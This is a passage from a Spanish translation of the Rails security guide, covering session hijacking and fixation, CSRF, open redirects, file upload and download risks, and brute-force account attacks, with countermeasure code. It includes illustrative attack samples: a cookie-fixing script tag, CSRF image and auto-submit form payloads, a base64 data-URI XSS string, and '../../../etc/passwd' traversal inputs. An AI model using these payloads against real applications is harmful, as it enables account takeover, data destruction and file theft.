**DO NOT READ THIS FILE ON GITHUB, GUIDES ARE PUBLISHED ON https://guides.rubyonrails.org.**, original file md5: f769f3ad2ac56ac5949224832c8307e3
Asegurando Aplicaciones Rails
===========================

Este manual describe problemas comunes de seguridad en aplicaciones web y cómo evitarlos con Rails.

Después de leer esta guía, sabrás:

* Todas las contramedidas _que están resaltadas_.
* El concepto de sesiones en Rails, qué poner en ellas y los métodos de ataque populares.
* Cómo simplemente visitar un sitio puede ser un problema de seguridad (con CSRF).
* A qué prestar atención al trabajar con archivos o proporcionar una interfaz de administración.
* Cómo gestionar usuarios: iniciar sesión y cerrar sesión y los métodos de ataque en todas las capas.
* Y los métodos de ataque de inyección más populares.

--------------------------------------------------------------------------------

Introducción
------------

Los marcos de aplicación web están hechos para ayudar a los desarrolladores a construir aplicaciones web. Algunos de ellos también te ayudan a asegurar la aplicación web. De hecho, un marco no es más seguro que otro: si lo usas correctamente, podrás construir aplicaciones seguras con muchos marcos. Ruby on Rails tiene algunos métodos auxiliares inteligentes, por ejemplo, contra la inyección SQL, por lo que esto apenas es un problema.

En general, no existe tal cosa como seguridad plug-n-play. La seguridad depende de las personas que utilizan el marco y, a veces, del método de desarrollo. Y depende de todas las capas de un entorno de aplicación web: el almacenamiento en el backend, el servidor web y la aplicación web en sí (y posiblemente otras capas o aplicaciones).

Sin embargo, el Grupo Gartner estima que el 75% de los ataques se producen en la capa de aplicación web y descubrió "que de 300 sitios auditados, el 97% es vulnerable a ataques". Esto se debe a que las aplicaciones web son relativamente fáciles de atacar, ya que son simples de entender y manipular, incluso por una persona sin conocimientos técnicos.

Las amenazas contra las aplicaciones web incluyen el secuestro de cuentas de usuario, eludir el control de acceso, leer o modificar datos sensibles o presentar contenido fraudulento. O un atacante podría instalar un programa troyano o software de envío de correo no deseado, apuntar al enriquecimiento financiero o causar daños a la marca modificando los recursos de la empresa. Para prevenir ataques, minimizar su impacto y eliminar puntos de ataque, primero debes comprender completamente los métodos de ataque para encontrar las contramedidas correctas. Eso es lo que pretende esta guía.

Para desarrollar aplicaciones web seguras, debes mantenerte actualizado en todas las capas y conocer a tus enemigos. Para estar al día, suscríbete a listas de correo de seguridad, lee blogs de seguridad y convierte las actualizaciones y las comprobaciones de seguridad en un hábito (consulta el capítulo [Recursos adicionales](#recursos-adicionales)). Se hace manualmente porque así es como encuentras los problemas de seguridad lógica desagradables.

Sesiones
--------

Este capítulo describe algunos ataques particulares relacionados con las sesiones y medidas de seguridad para proteger tus datos de sesión.

### ¿Qué son las sesiones?

INFO: Las sesiones permiten que la aplicación mantenga un estado específico del usuario mientras este interactúa con la aplicación. Por ejemplo, las sesiones permiten que los usuarios se autentiquen una vez y permanezcan conectados para futuras solicitudes.

La mayoría de las aplicaciones necesitan realizar un seguimiento del estado de los usuarios que interactúan con la aplicación. Esto podría ser el contenido de un carrito de compras o el ID de usuario del usuario que ha iniciado sesión actualmente. Este tipo de estado específico del usuario se puede almacenar en la sesión.

Rails proporciona un objeto de sesión para cada usuario que accede a la aplicación. Si el usuario ya tiene una sesión activa, Rails utiliza la sesión existente. De lo contrario, se crea una nueva sesión.

NOTA: Lee más sobre las sesiones y cómo usarlas en la [Guía general de Action Controller](action_controller_overview.html#session).

### Secuestro de sesiones

ADVERTENCIA: _Robar la ID de sesión de un usuario permite a un atacante utilizar la aplicación web en nombre de la víctima._

Muchas aplicaciones web tienen un sistema de autenticación: un usuario proporciona un nombre de usuario y una contraseña, la aplicación web los verifica y almacena el ID de usuario correspondiente en el hash de sesión. A partir de ahora, la sesión es válida. En cada solicitud, la aplicación cargará al usuario identificado por el ID de usuario en la sesión, sin necesidad de una nueva autenticación. La ID de sesión en la cookie identifica la sesión.

Por lo tanto, la cookie sirve como autenticación temporal para la aplicación web. Cualquier persona que se apodere de una cookie de otra persona puede utilizar la aplicación web como ese usuario, con posibles consecuencias graves. Aquí hay algunas formas de secuestrar una sesión y sus contramedidas:
* Olisquear la cookie en una red insegura. Una LAN inalámbrica puede ser un ejemplo de este tipo de red. En una LAN inalámbrica no encriptada, es especialmente fácil escuchar el tráfico de todos los clientes conectados. Para el constructor de aplicaciones web, esto significa _proporcionar una conexión segura a través de SSL_. En Rails 3.1 y versiones posteriores, esto se puede lograr forzando siempre la conexión SSL en el archivo de configuración de la aplicación:

    ```ruby
    config.force_ssl = true
    ```

* La mayoría de las personas no borran las cookies después de trabajar en una terminal pública. Por lo tanto, si el último usuario no cerró la sesión de una aplicación web, podrías usarla como ese usuario. Proporciona al usuario un _botón de cierre de sesión_ en la aplicación web y _hazlo prominente_.

* Muchos exploits de cross-site scripting (XSS) tienen como objetivo obtener la cookie del usuario. Leerás [más sobre XSS](#cross-site-scripting-xss) más adelante.

* En lugar de robar una cookie desconocida para el atacante, fijan el identificador de sesión de un usuario (en la cookie) conocido por ellos. Lee más sobre esta llamada fijación de sesión más adelante.

El objetivo principal de la mayoría de los atacantes es ganar dinero. Los precios en el mercado negro para cuentas de inicio de sesión bancarias robadas oscilan entre el 0.5% y el 10% del saldo de la cuenta, $0.5-$30 por números de tarjetas de crédito ($20-$60 con detalles completos), $0.1-$1.5 por identidades (nombre, SSN y fecha de nacimiento), $20-$50 por cuentas de minoristas y $6-$10 por cuentas de proveedores de servicios en la nube, según el [Informe de Amenazas de Seguridad en Internet de Symantec (2017)](https://docs.broadcom.com/docs/istr-22-2017-en).

### Almacenamiento de Sesiones

NOTA: Rails utiliza `ActionDispatch::Session::CookieStore` como el almacenamiento de sesiones predeterminado.

CONSEJO: Aprende más sobre otros almacenamientos de sesiones en la [Guía de Descripción General de Action Controller](action_controller_overview.html#session).

`CookieStore` de Rails guarda el hash de sesión en una cookie en el lado del cliente. El servidor recupera el hash de sesión de la cookie y elimina la necesidad de un ID de sesión. Esto aumentará considerablemente la velocidad de la aplicación, pero es una opción de almacenamiento controvertida y debes pensar en las implicaciones de seguridad y las limitaciones de almacenamiento:

* Las cookies tienen un límite de tamaño de 4 kB. Utiliza las cookies solo para datos relevantes para la sesión.

* Las cookies se almacenan en el lado del cliente. El cliente puede conservar el contenido de las cookies incluso para cookies caducadas. El cliente puede copiar las cookies en otras máquinas. Evita almacenar datos sensibles en las cookies.

* Las cookies son temporales por naturaleza. El servidor puede establecer un tiempo de expiración para la cookie, pero el cliente puede eliminar la cookie y su contenido antes de eso. Persiste todos los datos que sean de naturaleza más permanente en el lado del servidor.

* Las cookies de sesión no se invalidan por sí mismas y pueden ser reutilizadas maliciosamente. Puede ser una buena idea que tu aplicación invalide las cookies de sesión antiguas utilizando una marca de tiempo almacenada.

* Rails encripta las cookies de forma predeterminada. El cliente no puede leer ni editar el contenido de la cookie sin romper la encriptación. Si cuidas adecuadamente tus secretos, puedes considerar que tus cookies están generalmente seguras.

`CookieStore` utiliza el tarro de cookies [encriptadas](https://api.rubyonrails.org/classes/ActionDispatch/Cookies/ChainedCookieJars.html#method-i-encrypted) para proporcionar una ubicación segura y encriptada para almacenar datos de sesión. Las sesiones basadas en cookies proporcionan tanto integridad como confidencialidad a sus contenidos. La clave de encriptación, así como la clave de verificación utilizada para las cookies [firmadas](https://api.rubyonrails.org/classes/ActionDispatch/Cookies/ChainedCookieJars.html#method-i-signed), se derivan del valor de configuración `secret_key_base`.

CONSEJO: Las claves deben ser largas y aleatorias. Utiliza `bin/rails secret` para obtener nuevas claves únicas.

INFO: Aprende más sobre [la gestión de credenciales más adelante en esta guía](security.html#custom-credentials).

También es importante utilizar valores de sal diferentes para cookies encriptadas y firmadas. Utilizar el mismo valor para diferentes configuraciones de sal puede hacer que se utilice la misma clave derivada para diferentes características de seguridad, lo que a su vez puede debilitar la fuerza de la clave.

En aplicaciones de prueba y desarrollo, se obtiene una `secret_key_base` derivada del nombre de la aplicación. Otros entornos deben utilizar una clave aleatoria presente en `config/credentials.yml.enc`, que se muestra aquí en su estado desencriptado:

```yaml
secret_key_base: 492f...
```

ADVERTENCIA: Si las claves de tu aplicación pueden haber sido expuestas, considera cambiarlas. Ten en cuenta que cambiar `secret_key_base` expirará las sesiones activas actualmente y requerirá que todos los usuarios inicien sesión nuevamente. Además de los datos de sesión, las cookies encriptadas, las cookies firmadas y los archivos de Active Storage también pueden verse afectados.

### Rotación de Configuraciones de Cookies Encriptadas y Firmadas

La rotación es ideal para cambiar las configuraciones de las cookies y asegurarse de que las cookies antiguas no sean invalidadas de inmediato. De esta manera, tus usuarios tienen la oportunidad de visitar tu sitio, leer su cookie con una configuración antigua y volver a escribirla con el nuevo cambio. La rotación se puede eliminar una vez que te sientas lo suficientemente cómodo de que los usuarios hayan tenido la oportunidad de actualizar sus cookies.
Es posible rotar los cifrados y resúmenes utilizados para las cookies encriptadas y firmadas.

Por ejemplo, para cambiar el resumen utilizado para las cookies firmadas de SHA1 a SHA256, primero asignarías el nuevo valor de configuración:

```ruby
Rails.application.config.action_dispatch.signed_cookie_digest = "SHA256"
```

Ahora agrega una rotación para el antiguo resumen SHA1 para que las cookies existentes se actualicen sin problemas al nuevo resumen SHA256.

```ruby
Rails.application.config.action_dispatch.cookies_rotations.tap do |cookies|
  cookies.rotate :signed, digest: "SHA1"
end
```

Luego, todas las cookies firmadas escritas se digerirán con SHA256. Las cookies antiguas que se escribieron con SHA1 aún se pueden leer y, si se acceden, se escribirán con el nuevo resumen para que se actualicen y no sean inválidas cuando se elimine la rotación.

Una vez que los usuarios con cookies firmadas digeridas con SHA1 ya no tengan la posibilidad de que se reescriban sus cookies, elimina la rotación.

Si bien puedes configurar tantas rotaciones como desees, no es común tener muchas rotaciones al mismo tiempo.

Para obtener más detalles sobre la rotación de claves con mensajes encriptados y firmados, así como las diversas opciones que acepta el método `rotate`, consulta la documentación de la API de [MessageEncryptor](https://api.rubyonrails.org/classes/ActiveSupport/MessageEncryptor.html) y [MessageVerifier](https://api.rubyonrails.org/classes/ActiveSupport/MessageVerifier.html).

### Ataques de reproducción para sesiones de CookieStore

CONSEJO: _Otro tipo de ataque del que debes estar consciente al usar `CookieStore` es el ataque de reproducción._

Funciona de la siguiente manera:

- Un usuario recibe créditos, la cantidad se almacena en una sesión (lo cual de por sí es una mala idea, pero lo haremos con fines de demostración).
- El usuario compra algo.
- El nuevo valor de crédito ajustado se almacena en la sesión.
- El usuario toma la cookie del primer paso (que previamente copió) y reemplaza la cookie actual en el navegador.
- El usuario recupera su crédito original.

Incluir un nonce (un valor aleatorio) en la sesión resuelve los ataques de reproducción. Un nonce solo es válido una vez y el servidor debe realizar un seguimiento de todos los nonces válidos. Se vuelve aún más complicado si tienes varios servidores de aplicaciones. Almacenar nonces en una tabla de base de datos anularía el propósito de CookieStore (evitar el acceso a la base de datos).

La mejor _solución contra esto es no almacenar este tipo de datos en una sesión, sino en la base de datos_. En este caso, almacena el crédito en la base de datos y el `logged_in_user_id` en la sesión.

### Fijación de sesión

NOTA: _Además de robar el ID de sesión de un usuario, el atacante puede fijar un ID de sesión conocido por ellos. Esto se llama fijación de sesión._

![Fijación de sesión](images/security/session_fixation.png)

Este ataque se centra en fijar un ID de sesión conocido por el atacante y forzar al navegador del usuario a utilizar este ID. Por lo tanto, no es necesario que el atacante robe el ID de sesión posteriormente. Así es como funciona este ataque:

- El atacante crea un ID de sesión válido: carga la página de inicio de sesión de la aplicación web donde desea fijar la sesión y toma el ID de sesión de la cookie de la respuesta (ver números 1 y 2 en la imagen).
- Mantienen la sesión accediendo periódicamente a la aplicación web para mantener una sesión que está por expirar.
- El atacante fuerza al navegador del usuario a utilizar este ID de sesión (ver número 3 en la imagen). Como no se puede cambiar una cookie de otro dominio (debido a la política de mismo origen), el atacante debe ejecutar un JavaScript desde el dominio de la aplicación web objetivo. Inyectar el código JavaScript en la aplicación mediante XSS logra este ataque. Aquí tienes un ejemplo: `<script>document.cookie="_session_id=16d5b78abb28e3d6206b60f22a03c8d9";</script>`. Lee más sobre XSS e inyección más adelante.
- El atacante atrae a la víctima a la página infectada con el código JavaScript. Al ver la página, el navegador de la víctima cambiará el ID de sesión al ID de sesión trampa.
- Como la nueva sesión trampa no se ha utilizado, la aplicación web requerirá que el usuario se autentique.
- A partir de ahora, la víctima y el atacante utilizarán la aplicación web con la misma sesión: la sesión se volvió válida y la víctima no se dio cuenta del ataque.

### Fijación de sesión - Contramedidas

CONSEJO: _Una línea de código te protegerá de la fijación de sesión._

La contramedida más efectiva es _emitir un nuevo identificador de sesión_ y declarar el antiguo como inválido después de un inicio de sesión exitoso. De esta manera, un atacante no puede utilizar el identificador de sesión fijado. Esta también es una buena contramedida contra el secuestro de sesión. Así es cómo crear una nueva sesión en Rails:
```ruby
reset_session
```

Si utilizas la popular gema [Devise](https://rubygems.org/gems/devise) para la gestión de usuarios, automáticamente expirará las sesiones al iniciar y cerrar sesión. Si creas tu propio sistema, recuerda expirar la sesión después de la acción de inicio de sesión (cuando se crea la sesión). Esto eliminará los valores de la sesión, por lo tanto, _tendrás que transferirlos a la nueva sesión_.

Otra medida de seguridad es _guardar propiedades específicas del usuario en la sesión_, verificarlas cada vez que llegue una solicitud y denegar el acceso si la información no coincide. Estas propiedades podrían ser la dirección IP remota o el agente de usuario (el nombre del navegador web), aunque este último es menos específico del usuario. Al guardar la dirección IP, debes tener en cuenta que hay proveedores de servicios de Internet u organizaciones grandes que ponen a sus usuarios detrás de proxies. _Estos pueden cambiar durante el transcurso de una sesión_, por lo que estos usuarios no podrán utilizar tu aplicación, o solo de manera limitada.

### Caducidad de la sesión

NOTA: _Las sesiones que nunca caducan amplían el marco de tiempo para ataques como falsificación de solicitudes entre sitios (CSRF), secuestro de sesión y fijación de sesión._

Una posibilidad es establecer la fecha de caducidad de la cookie con el ID de sesión. Sin embargo, el cliente puede editar las cookies almacenadas en el navegador web, por lo que es más seguro caducar las sesiones en el servidor. Aquí tienes un ejemplo de cómo _caducar sesiones en una tabla de base de datos_. Llama a `Session.sweep(20.minutes)` para caducar las sesiones que se utilizaron hace más de 20 minutos.

```ruby
class Session < ApplicationRecord
  def self.sweep(time = 1.hour)
    where(updated_at: ...time.ago).delete_all
  end
end
```

La sección sobre la fijación de sesión introdujo el problema de las sesiones mantenidas. Un atacante que mantiene una sesión cada cinco minutos puede mantener la sesión activa para siempre, aunque caduques las sesiones. Una solución simple para esto sería agregar una columna `created_at` a la tabla de sesiones. Ahora puedes eliminar sesiones que se crearon hace mucho tiempo. Utiliza esta línea en el método de barrido anterior:

```ruby
where(updated_at: ...time.ago).or(where(created_at: ...2.days.ago)).delete_all
```

Falsificación de solicitudes entre sitios (CSRF)
-----------------------------------------------

Este método de ataque funciona al incluir código malicioso o un enlace en una página que accede a una aplicación web en la que se cree que el usuario ha iniciado sesión. Si la sesión para esa aplicación web no ha expirado, un atacante puede ejecutar comandos no autorizados.

![Falsificación de solicitudes entre sitios](images/security/csrf.png)

En el [capítulo de sesiones](#sessions) has aprendido que la mayoría de las aplicaciones Rails utilizan sesiones basadas en cookies. Ya sea que almacenen el ID de sesión en la cookie y tengan un hash de sesión en el servidor, o que el hash de sesión completo esté en el lado del cliente. En ambos casos, el navegador enviará automáticamente la cookie en cada solicitud a un dominio, si puede encontrar una cookie para ese dominio. El punto controvertido es que si la solicitud proviene de un sitio de un dominio diferente, también enviará la cookie. Comencemos con un ejemplo:

* Bob navega por un foro de mensajes y ve una publicación de un hacker donde hay un elemento HTML de imagen creado. El elemento hace referencia a un comando en la aplicación de gestión de proyectos de Bob, en lugar de un archivo de imagen: `<img src="http://www.webapp.com/project/1/destroy">`
* La sesión de Bob en `www.webapp.com` todavía está activa, porque no cerró sesión hace unos minutos.
* Al ver la publicación, el navegador encuentra una etiqueta de imagen. Intenta cargar la imagen sospechosa desde `www.webapp.com`. Como se explicó antes, también enviará la cookie con el ID de sesión válido.
* La aplicación web en `www.webapp.com` verifica la información del usuario en el hash de sesión correspondiente y destruye el proyecto con el ID 1. Luego devuelve una página de resultado que es un resultado inesperado para el navegador, por lo que no mostrará la imagen.
* Bob no se da cuenta del ataque, pero unos días después descubre que el proyecto número uno ha desaparecido.

Es importante tener en cuenta que la imagen o enlace creado no necesariamente tiene que estar en el dominio de la aplicación web, puede estar en cualquier lugar, en un foro, publicación de blog o correo electrónico.

CSRF aparece muy raramente en CVE (Vulnerabilidades y Exposiciones Comunes) - menos del 0.1% en 2006 - pero realmente es un "gigante dormido" [Grossman]. Esto contrasta fuertemente con los resultados en muchos trabajos de contratos de seguridad: _CSRF es un problema de seguridad importante_.
### Contramedidas CSRF

NOTA: _En primer lugar, como lo requiere el W3C, utiliza GET y POST de manera apropiada. En segundo lugar, un token de seguridad en las solicitudes que no sean GET protegerá tu aplicación de CSRF._

#### Utiliza GET y POST de manera apropiada

El protocolo HTTP básicamente proporciona dos tipos principales de solicitudes: GET y POST (DELETE, PUT y PATCH deben usarse como POST). El Consorcio World Wide Web (W3C) proporciona una lista de verificación para elegir entre HTTP GET o POST:

**Utiliza GET si:**

* La interacción es más _como una pregunta_ (es decir, es una operación segura como una consulta, operación de lectura o búsqueda).

**Utiliza POST si:**

* La interacción es más _como una orden_, o
* La interacción _cambia el estado_ del recurso de una manera que el usuario percibiría (por ejemplo, una suscripción a un servicio), o
* El usuario es _responsable de los resultados_ de la interacción.

Si tu aplicación web es RESTful, es posible que estés acostumbrado a verbos HTTP adicionales, como PATCH, PUT o DELETE. Sin embargo, algunos navegadores web heredados no los admiten, solo GET y POST. Rails utiliza un campo oculto `_method` para manejar estos casos.

_Las solicitudes POST también se pueden enviar automáticamente_. En este ejemplo, el enlace www.harmless.com se muestra como el destino en la barra de estado del navegador. Pero en realidad, se ha creado dinámicamente un nuevo formulario que envía una solicitud POST.

```html
<a href="http://www.harmless.com/" onclick="
  var f = document.createElement('form');
  f.style.display = 'none';
  this.parentNode.appendChild(f);
  f.method = 'POST';
  f.action = 'http://www.example.com/account/destroy';
  f.submit();
  return false;">A la encuesta inofensiva</a>
```

O el atacante coloca el código en el controlador de eventos onmouseover de una imagen:

```html
<img src="http://www.harmless.com/img" width="400" height="400" onmouseover="..." />
```

Existen muchas otras posibilidades, como utilizar una etiqueta `<script>` para realizar una solicitud entre sitios a una URL con una respuesta JSONP o JavaScript. La respuesta es código ejecutable que el atacante puede encontrar una forma de ejecutar, posiblemente extrayendo datos sensibles. Para protegerse contra esta filtración de datos, debemos prohibir las etiquetas `<script>` entre sitios. Sin embargo, las solicitudes Ajax obedecen la política de mismo origen del navegador (solo se permite que tu propio sitio inicie `XmlHttpRequest`), por lo que podemos permitir de manera segura que devuelvan respuestas JavaScript.

NOTA: No podemos distinguir el origen de una etiqueta `<script>`: si es una etiqueta en tu propio sitio o en algún otro sitio malicioso, por lo que debemos bloquear todas las etiquetas `<script>` en general, incluso si en realidad es un script seguro del mismo origen servido desde tu propio sitio. En estos casos, omite explícitamente la protección CSRF en acciones que sirven JavaScript destinado a una etiqueta `<script>`.

#### Token de seguridad requerido

Para protegerse contra todas las demás solicitudes falsificadas, introducimos un _token de seguridad requerido_ que nuestro sitio conoce pero otros sitios no conocen. Incluimos el token de seguridad en las solicitudes y lo verificamos en el servidor. Esto se hace automáticamente cuando [`config.action_controller.default_protect_from_forgery`][] se establece en `true`, que es el valor predeterminado para las aplicaciones Rails recién creadas. También puedes hacerlo manualmente agregando lo siguiente a tu controlador de aplicaciones:

```ruby
protect_from_forgery with: :exception
```

Esto incluirá un token de seguridad en todos los formularios generados por Rails. Si el token de seguridad no coincide con lo esperado, se lanzará una excepción.

Al enviar formularios con [Turbo](https://turbo.hotwired.dev/), también se requiere el token de seguridad. Turbo busca el token en las etiquetas meta `csrf` de tu diseño de aplicación y lo agrega a la solicitud en el encabezado de solicitud `X-CSRF-Token`. Estas etiquetas meta se crean con el método auxiliar [`csrf_meta_tags`][]:

```erb
<head>
  <%= csrf_meta_tags %>
</head>
```

lo cual resulta en:

```html
<head>
  <meta name="csrf-param" content="authenticity_token" />
  <meta name="csrf-token" content="EL-TOKEN" />
</head>
```

Al realizar tus propias solicitudes que no sean GET desde JavaScript, también se requiere el token de seguridad. [Rails Request.JS](https://github.com/rails/request.js) es una biblioteca de JavaScript que encapsula la lógica de agregar los encabezados de solicitud requeridos.

Cuando uses otra biblioteca para realizar llamadas Ajax, es necesario agregar el token de seguridad como un encabezado predeterminado por ti mismo. Para obtener el token de la etiqueta meta, puedes hacer algo como esto:

```javascript
document.head.querySelector("meta[name=csrf-token]")?.content
```

#### Eliminación de cookies persistentes

Es común utilizar cookies persistentes para almacenar información del usuario, por ejemplo, con `cookies.permanent`. En este caso, las cookies no se eliminarán y la protección CSRF por defecto no será efectiva. Si estás utilizando un almacén de cookies diferente a la sesión para esta información, debes manejar qué hacer con ella por ti mismo:
```ruby
rescue_from ActionController::InvalidAuthenticityToken do |exception|
  sign_out_user # Método de ejemplo que destruirá las cookies del usuario
end
```

El método anterior se puede colocar en `ApplicationController` y se llamará cuando no esté presente o sea incorrecto un token de CSRF en una solicitud que no sea GET.

Tenga en cuenta que _las vulnerabilidades de scripting entre sitios (XSS) eluden todas las protecciones de CSRF_. XSS le da al atacante acceso a todos los elementos de una página, por lo que pueden leer el token de seguridad de CSRF de un formulario o enviar directamente el formulario. Lea [más sobre XSS](#cross-site-scripting-xss) más adelante.


Redirección y archivos
---------------------

Otra clase de vulnerabilidades de seguridad se refiere al uso de redirección y archivos en aplicaciones web.

### Redirección

ADVERTENCIA: _La redirección en una aplicación web es una herramienta subestimada de los crackers: no solo pueden redirigir al usuario a un sitio web trampa, sino que también pueden crear un ataque autocontenido._

Siempre que se permita al usuario pasar (partes de) la URL para la redirección, existe una posible vulnerabilidad. El ataque más obvio sería redirigir a los usuarios a una aplicación web falsa que se ve y se siente exactamente como la original. Este ataque de phishing funciona enviando un enlace no sospechoso en un correo electrónico a los usuarios, inyectando el enlace mediante XSS en la aplicación web o colocando el enlace en un sitio externo. No es sospechoso porque el enlace comienza con la URL de la aplicación web y la URL del sitio malicioso está oculta en el parámetro de redirección: http://www.example.com/site/redirect?to=www.attacker.com. Aquí hay un ejemplo de una acción heredada:

```ruby
def legacy
  redirect_to(params.update(action: 'main'))
end
```

Esto redirigirá al usuario a la acción principal si intentaron acceder a una acción heredada. La intención era preservar los parámetros de URL de la acción heredada y pasarlos a la acción principal. Sin embargo, puede ser explotado por un atacante si incluyeron una clave de host en la URL:

```
http://www.example.com/site/legacy?param1=xy&param2=23&host=www.attacker.com
```

Si está al final de la URL, apenas se notará y redirigirá al usuario al host `attacker.com`. Como regla general, pasar la entrada del usuario directamente a `redirect_to` se considera peligroso. Una medida de seguridad simple sería _incluir solo los parámetros esperados en una acción heredada_ (nuevamente, un enfoque de lista permitida, en lugar de eliminar parámetros inesperados). _Y si redirige a una URL, verifíquela con una lista permitida o una expresión regular_.

#### XSS autocontenido

Otro ataque de redirección y XSS autocontenido funciona en Firefox y Opera mediante el uso del protocolo de datos. Este protocolo muestra su contenido directamente en el navegador y puede ser cualquier cosa, desde HTML o JavaScript hasta imágenes completas:

`data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K`

Este ejemplo es un JavaScript codificado en Base64 que muestra un cuadro de mensaje simple. En una URL de redirección, un atacante podría redirigir a esta URL con el código malicioso en ella. Como medida de seguridad, _no permita que el usuario proporcione (partes de) la URL a la que se redirigirá_.

### Cargas de archivos

NOTA: _Asegúrese de que las cargas de archivos no sobrescriban archivos importantes y procesen archivos multimedia de forma asíncrona._

Muchas aplicaciones web permiten a los usuarios cargar archivos. _Siempre se deben filtrar los nombres de archivo, que el usuario puede elegir (en parte)_, ya que un atacante podría usar un nombre de archivo malicioso para sobrescribir cualquier archivo en el servidor. Si almacena las cargas de archivos en /var/www/uploads y el usuario ingresa un nombre de archivo como "../../../etc/passwd", podría sobrescribir un archivo importante. Por supuesto, el intérprete de Ruby necesitaría los permisos adecuados para hacerlo, lo que es otra razón para ejecutar servidores web, servidores de bases de datos y otros programas como un usuario de Unix con menos privilegios.

Cuando filtre los nombres de archivo proporcionados por el usuario, _no intente eliminar partes maliciosas_. Piense en una situación en la que la aplicación web elimina todos los "../" en un nombre de archivo y un atacante usa una cadena como "....//" - el resultado será "../". Es mejor usar un enfoque de lista permitida, que _verifique la validez de un nombre de archivo con un conjunto de caracteres aceptados_. Esto se opone a un enfoque de lista restringida que intenta eliminar caracteres no permitidos. En caso de que no sea un nombre de archivo válido, rechácelo (o reemplace los caracteres no aceptados), pero no los elimine. Aquí está el sanitizador de nombres de archivo del complemento [attachment_fu](https://github.com/technoweenie/attachment_fu/tree/master):

```ruby
def sanitize_filename(filename)
  filename.strip.tap do |name|
    # NOTA: File.basename no funciona correctamente con rutas de Windows en Unix
    # obtener solo el nombre de archivo, no toda la ruta
    name.sub!(/\A.*(\\|\/)/, '')
    # Finalmente, reemplazar todos los caracteres no alfanuméricos, subrayados
    # o puntos con un guión bajo
    name.gsub!(/[^\w.-]/, '_')
  end
end
```
Una desventaja significativa del procesamiento síncrono de cargas de archivos (como puede hacerlo el complemento `attachment_fu` con imágenes) es su _vulnerabilidad a ataques de denegación de servicio_. Un atacante puede iniciar sincrónicamente la carga de archivos de imagen desde muchas computadoras, lo que aumenta la carga del servidor y eventualmente puede hacer que se bloquee o se detenga.

La solución a esto es _procesar archivos multimedia de forma asíncrona_: guardar el archivo multimedia y programar una solicitud de procesamiento en la base de datos. Un segundo proceso se encargará del procesamiento del archivo en segundo plano.

### Código ejecutable en cargas de archivos

ADVERTENCIA: _El código fuente en archivos cargados puede ejecutarse cuando se coloca en directorios específicos. No coloque las cargas de archivos en el directorio /public de Rails si es el directorio raíz de Apache._

El popular servidor web Apache tiene una opción llamada DocumentRoot. Este es el directorio raíz del sitio web, todo en este árbol de directorios será servido por el servidor web. Si hay archivos con una determinada extensión de nombre de archivo, el código en ellos se ejecutará cuando se solicite (puede requerir algunas opciones para configurarse). Ejemplos de esto son archivos PHP y CGI. Ahora piense en una situación en la que un atacante carga un archivo "file.cgi" con código en él, que se ejecutará cuando alguien descargue el archivo.

_Si su DocumentRoot de Apache apunta al directorio /public de Rails, no coloque las cargas de archivos en él_, guarde los archivos al menos un nivel más arriba.

### Descargas de archivos

NOTA: _Asegúrese de que los usuarios no puedan descargar archivos arbitrarios._

Así como debe filtrar los nombres de archivo para las cargas, también debe hacerlo para las descargas. El método `send_file()` envía archivos desde el servidor al cliente. Si utiliza un nombre de archivo que el usuario ingresó sin filtrar, se puede descargar cualquier archivo:

```ruby
send_file('/var/www/uploads/' + params[:filename])
```

Simplemente pase un nombre de archivo como "../../../etc/passwd" para descargar la información de inicio de sesión del servidor. Una solución simple contra esto es _verificar que el archivo solicitado esté en el directorio esperado_:

```ruby
basename = File.expand_path('../../files', __dir__)
filename = File.expand_path(File.join(basename, @file.public_filename))
raise if basename != File.expand_path(File.dirname(filename))
send_file filename, disposition: 'inline'
```

Otro enfoque (adicional) es almacenar los nombres de archivo en la base de datos y nombrar los archivos en el disco según los identificadores en la base de datos. Este también es un buen enfoque para evitar que se ejecute código posible en un archivo cargado. El complemento `attachment_fu` hace esto de manera similar.

Gestión de usuarios
-------------------

NOTA: _Casi todas las aplicaciones web tienen que lidiar con la autorización y autenticación. En lugar de crear la suya propia, es recomendable utilizar complementos comunes. Pero también manténgalos actualizados. Algunas precauciones adicionales pueden hacer que su aplicación sea aún más segura._

Hay varios complementos de autenticación disponibles para Rails. Buenos, como los populares [devise](https://github.com/heartcombo/devise) y [authlogic](https://github.com/binarylogic/authlogic), almacenan solo contraseñas con hash criptográfico, no contraseñas en texto plano. Desde Rails 3.1 también puede utilizar el método incorporado [`has_secure_password`](https://api.rubyonrails.org/classes/ActiveModel/SecurePassword/ClassMethods.html#method-i-has_secure_password), que admite el hash seguro de contraseñas, mecanismos de confirmación y recuperación.

### Ataques de fuerza bruta a cuentas

NOTA: _Los ataques de fuerza bruta a cuentas son ataques de prueba y error a las credenciales de inicio de sesión. Defiéndalos con mensajes de error más genéricos y posiblemente requiera ingresar un CAPTCHA._

Una lista de nombres de usuario para su aplicación web puede ser utilizada incorrectamente para realizar ataques de fuerza bruta a las contraseñas correspondientes, porque la mayoría de las personas no utilizan contraseñas sofisticadas. La mayoría de las contraseñas son una combinación de palabras de diccionario y posiblemente números. Entonces, armado con una lista de nombres de usuario y un diccionario, un programa automático puede encontrar la contraseña correcta en cuestión de minutos.

Por esta razón, la mayoría de las aplicaciones web mostrarán un mensaje de error genérico "nombre de usuario o contraseña incorrectos" si alguno de estos no es correcto. Si dijera "el nombre de usuario que ingresó no se ha encontrado", un atacante podría compilar automáticamente una lista de nombres de usuario.

Sin embargo, lo que la mayoría de los diseñadores de aplicaciones web descuidan son las páginas de olvido de contraseña. Estas páginas a menudo admiten que el nombre de usuario o la dirección de correo electrónico ingresados han sido (no) encontrados. Esto permite a un atacante compilar una lista de nombres de usuario y realizar ataques de fuerza bruta a las cuentas.

Para mitigar tales ataques, _muestre un mensaje de error genérico también en las páginas de olvido de contraseña_. Además, puede _requerir ingresar un CAPTCHA después de un número determinado de intentos fallidos de inicio de sesión desde una dirección IP específica_. Sin embargo, tenga en cuenta que esta no es una solución infalible contra programas automáticos, porque estos programas pueden cambiar su dirección IP exactamente con la misma frecuencia. Sin embargo, eleva la barrera de un ataque.
### Secuestro de cuentas

Muchas aplicaciones web facilitan el secuestro de cuentas de usuario. ¿Por qué no ser diferentes y hacerlo más difícil?

#### Contraseñas

